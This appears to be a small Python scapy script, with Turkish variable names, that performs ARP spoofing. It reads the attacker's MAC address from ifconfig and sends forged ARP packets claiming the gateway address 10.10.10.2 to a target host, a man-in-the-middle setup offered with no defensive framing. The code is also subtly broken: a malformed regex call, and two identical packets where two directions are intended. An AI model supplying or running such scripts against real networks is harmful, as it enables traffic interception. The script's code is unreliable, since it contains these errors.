from scapy.all import * 
import subprocess
hedef_ip="1.1.1.1"
gateway_ip="10.10.10.2"

ifconfigResult=subprocess.check_output("ifconfig eth0",shell=True).decode()
attacker_mac=re.search("ether(.*?)kullanıcı".ifconfigResult).group(1).strip()

eth=Ether(src=attacker_mac)
h_arp=ARP(hwsrc=attacker_mac,psrc=gateway_ip,pdst=hedef_ip)
g_arp=ARP(hwsrc=attacker_mac,psrc=gateway_ip,pdst=hedef_ip)
sendp(eth/h_arp)
sendp(eth/g_arp)
